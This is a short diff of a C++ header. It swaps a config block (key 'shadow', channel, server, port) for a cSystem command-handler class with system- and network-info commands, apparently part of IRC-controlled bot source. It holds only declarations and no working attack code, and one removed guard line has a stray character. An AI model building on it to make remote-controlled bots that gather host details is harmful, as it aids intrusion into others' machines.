@@ -19,12 +19,19 @@
  */
 
 #pragma once
-#ifndef __C_CONFIG_H__
-#define __C_CONFIG_H__f
-#define key "shadow"
-extern char channel[];
-extern char server[];
-extern int iPort;
+#ifndef __CSYSTEM_H__
+#define __CSYSTEM_H__
 
+class cSystem : public cCommandHandler
+{
+public:
+	cSystem();
+	~cSystem();
+	void Init();
+	command			m_cmdSysInfo, m_cmdNetInfo;
+	bool			HandleCommand(char* cmd, char* params, ...);
+	char*			NetInfo();
 
+	moduload	m_cSysModule;
+};
 #endif
